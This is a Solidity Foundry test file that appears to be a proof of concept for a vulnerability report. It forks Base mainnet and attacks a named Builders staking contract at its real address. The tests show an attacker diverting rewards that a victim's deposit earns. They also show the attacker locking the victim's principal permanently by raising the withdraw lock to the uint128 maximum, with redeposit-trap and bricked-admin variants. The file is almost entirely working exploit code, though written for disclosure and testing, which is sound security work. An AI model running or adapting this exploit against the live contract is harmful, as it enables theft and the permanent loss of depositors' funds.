// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// CH-1 variant B (attacker IS admin+claimAdmin) — full chain, 5x.
// Plus: variant A negative test (lock leg broken), redeposit anti-escape,
// 10-year-lock-is-delay vs max-lock-is-permanent, and bricked variant.
// Fork-local only. Attacker/victim/innocent are ordinary EOAs; no prank of
// owner/admin/multisig. `deal` only funds test accounts in the fork.

import "forge-std/Test.sol";

interface IERC20M {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IBuilders {
    struct Subnet {
        string name;
        address admin;
        uint128 unused1;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unused2;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }
    function createSubnet(Subnet calldata, SubnetMetadata calldata) external;
    function editSubnet(bytes32, Subnet calldata) external;
    function deposit(bytes32, uint256) external;
    function withdraw(bytes32, uint256) external;
    function claim(bytes32, address) external;
    function getSubnetId(string memory) external view returns (bytes32);
    function getCurrentSubnetRewards(bytes32) external view returns (uint256);
    function usersData(address, bytes32) external view returns (uint128, uint128, uint256, uint256);
}

contract ChainBaseTest is Test {
    string constant RPC = "https://mainnet.base.org";
    uint256 constant BLOCK = 53387518;
    address constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;

    address attacker = address(0xA77A);
    address victim = address(0xB1C7);
    address innocent = address(0x1A0c);

    function setUp() public {
        vm.createSelectFork(RPC, BLOCK);
        deal(MOR, attacker, 100000 ether);
        deal(MOR, victim, 100000 ether);
        deal(MOR, innocent, 100000 ether);
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(innocent, 100 ether);
    }

    function _meta() internal pure returns (IBuilders.SubnetMetadata memory) {
        return IBuilders.SubnetMetadata("slug", "desc", "https://example.invalid", "img");
    }

    function _subnet(string memory n, address a, address c, uint128 lock, uint256 minDep)
        internal
        pure
        returns (IBuilders.Subnet memory)
    {
        return IBuilders.Subnet(n, a, 0, lock, 0, minDep, c);
    }

    function _createAs(address who, string memory name, address admin, address claimAdmin)
        internal
        returns (bytes32 id)
    {
        vm.prank(who);
        IBuilders(BUILDERS).createSubnet(_subnet(name, admin, claimAdmin, 604800, 1), _meta());
        id = IBuilders(BUILDERS).getSubnetId(name);
    }

    function _deposit(address who, bytes32 id, uint256 amt) internal {
        vm.startPrank(who);
        IERC20M(MOR).approve(BUILDERS, amt);
        IBuilders(BUILDERS).deposit(id, amt);
        vm.stopPrank();
    }

    // ---------- CH-1 (variant B: attacker IS admin+claimAdmin) — full chain, 5x ----------
    function testCH1_SquatPlusLock_AttackerAdmin_5x() public {
        for (uint256 i = 0; i < 5; i++) {
            string memory name = string(abi.encodePacked("ChainSquat", vm.toString(i)));
            bytes32 id = _createAs(attacker, name, attacker, attacker);
            _deposit(victim, id, 1000 ether);
            vm.warp(block.timestamp + 30 days);
            uint256 pending = IBuilders(BUILDERS).getCurrentSubnetRewards(id);
            assertGt(pending, 0, "squat subnet must accrue rewards");
            // Attacker diverts the victim-attracted reward.
            uint256 balBefore = IERC20M(MOR).balanceOf(attacker);
            vm.prank(attacker);
            IBuilders(BUILDERS).claim(id, attacker);
            uint256 gained = IERC20M(MOR).balanceOf(attacker) - balBefore;
            assertGt(gained, 0, "attacker claim must pay out");
            assertEq(gained, pending, "claim pays exactly the pending amount");
            // Victim cannot claim (not admin/claimAdmin).
            vm.prank(victim);
            vm.expectRevert("BU: invalid caller");
            IBuilders(BUILDERS).claim(id, victim);
            // Attacker raises the lock to uint128 max AFTER the victim staked.
            vm.prank(attacker);
            IBuilders(BUILDERS).editSubnet(id, _subnet(name, attacker, attacker, type(uint128).max, 1));
            vm.warp(block.timestamp + 365 days);
            // Victim cannot withdraw anything: full or partial, a year later.
            vm.prank(victim);
            vm.expectRevert(stdError.arithmeticError);
            IBuilders(BUILDERS).withdraw(id, 1000 ether);
            vm.prank(victim);
            vm.expectRevert(stdError.arithmeticError);
            IBuilders(BUILDERS).withdraw(id, 1 wei);
            (,, uint256 dep,) = IBuilders(BUILDERS).usersData(victim, id);
            assertEq(dep, 1000 ether, "principal stays locked");
            emit log_named_uint("CH1 iter reward diverted MOR", gained);
            emit log_named_uint("CH1 iter principal locked MOR", dep);
            emit log_named_uint("CH1 iter TOTAL victim loss MOR", dep + gained);
        }
    }

    // ---------- CH-1 variant A (admin=innocent) — lock leg BROKEN, do not report this variant ----------
    function testCH1_InnocentAdminVariant_LockLegBroken() public {
        bytes32 id = _createAs(attacker, "InnocentAdminProj", innocent, attacker);
        _deposit(victim, id, 500 ether);
        vm.warp(block.timestamp + 30 days);
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        IBuilders(BUILDERS).editSubnet(id, _subnet("InnocentAdminProj", innocent, attacker, type(uint128).max, 1));
        vm.prank(victim);
        IBuilders(BUILDERS).withdraw(id, 500 ether);
        (,, uint256 dep,) = IBuilders(BUILDERS).usersData(victim, id);
        assertEq(dep, 0, "innocent-admin variant: principal freely withdrawable");
        bytes32 id2 = _createAs(attacker, "InnocentAdminProj2", innocent, attacker);
        _deposit(victim, id2, 500 ether);
        vm.warp(block.timestamp + 30 days);
        assertGt(IBuilders(BUILDERS).getCurrentSubnetRewards(id2), 0);
        vm.prank(innocent);
        IBuilders(BUILDERS).editSubnet(id2, _subnet("InnocentAdminProj2", innocent, innocent, 604800, 1));
        uint256 balBefore = IERC20M(MOR).balanceOf(innocent);
        vm.prank(innocent);
        IBuilders(BUILDERS).claim(id2, innocent);
        assertGt(IERC20M(MOR).balanceOf(innocent) - balBefore, 0, "innocent admin reclaims reward");
        vm.prank(attacker);
        vm.expectRevert("BU: invalid caller");
        IBuilders(BUILDERS).claim(id2, attacker);
    }

    // ---------- Escapes: redeposit worsens the lock; 10y lock is delay, max is permanent ----------
    function testCH1_RedepositAntiEscape() public {
        bytes32 id = _createAs(attacker, "RedepositTrap", attacker, attacker);
        _deposit(victim, id, 1000 ether);
        vm.prank(attacker);
        IBuilders(BUILDERS).editSubnet(id, _subnet("RedepositTrap", attacker, attacker, type(uint128).max, 1));
        _deposit(victim, id, 1 ether);
        (,, uint256 dep,) = IBuilders(BUILDERS).usersData(victim, id);
        assertEq(dep, 1001 ether);
        vm.warp(block.timestamp + 365 days);
        vm.prank(victim);
        vm.expectRevert(stdError.arithmeticError);
        IBuilders(BUILDERS).withdraw(id, 1001 ether);
    }

    function testCH1_TenYearLockIsDelay_MaxLockIsPermanent() public {
        bytes32 id = _createAs(attacker, "TenYearTrap", attacker, attacker);
        _deposit(victim, id, 1000 ether);
        vm.prank(attacker);
        IBuilders(BUILDERS).editSubnet(id, _subnet("TenYearTrap", attacker, attacker, 315360000, 1));
        vm.warp(block.timestamp + 365 days);
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        IBuilders(BUILDERS).withdraw(id, 1000 ether);
        vm.warp(block.timestamp + 10 * 365 days + 2 days);
        vm.prank(victim);
        IBuilders(BUILDERS).withdraw(id, 1000 ether);
        (,, uint256 dep,) = IBuilders(BUILDERS).usersData(victim, id);
        assertEq(dep, 0);
        bytes32 id2 = _createAs(attacker, "MaxTrap", attacker, attacker);
        _deposit(victim, id2, 1000 ether);
        vm.prank(attacker);
        IBuilders(BUILDERS).editSubnet(id2, _subnet("MaxTrap", attacker, attacker, type(uint128).max, 1));
        vm.warp(block.timestamp + 100 * 365 days);
        vm.prank(victim);
        vm.expectRevert(stdError.arithmeticError);
        IBuilders(BUILDERS).withdraw(id2, 1000 ether);
    }

    function testCH1_BrickedVariant_DeadAdmin() public {
        bytes32 id = _createAs(attacker, "BrickedProj", attacker, attacker);
        _deposit(victim, id, 1000 ether);
        vm.prank(attacker);
        IBuilders(BUILDERS).editSubnet(id, _subnet("BrickedProj", DEAD, DEAD, type(uint128).max, 1));
        vm.prank(attacker);
        vm.expectRevert("BU: invalid caller");
        IBuilders(BUILDERS).claim(id, attacker);
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        IBuilders(BUILDERS).editSubnet(id, _subnet("BrickedProj", attacker, attacker, 604800, 1));
        vm.warp(block.timestamp + 365 days);
        vm.prank(victim);
        vm.expectRevert(stdError.arithmeticError);
        IBuilders(BUILDERS).withdraw(id, 1000 ether);
    }
}
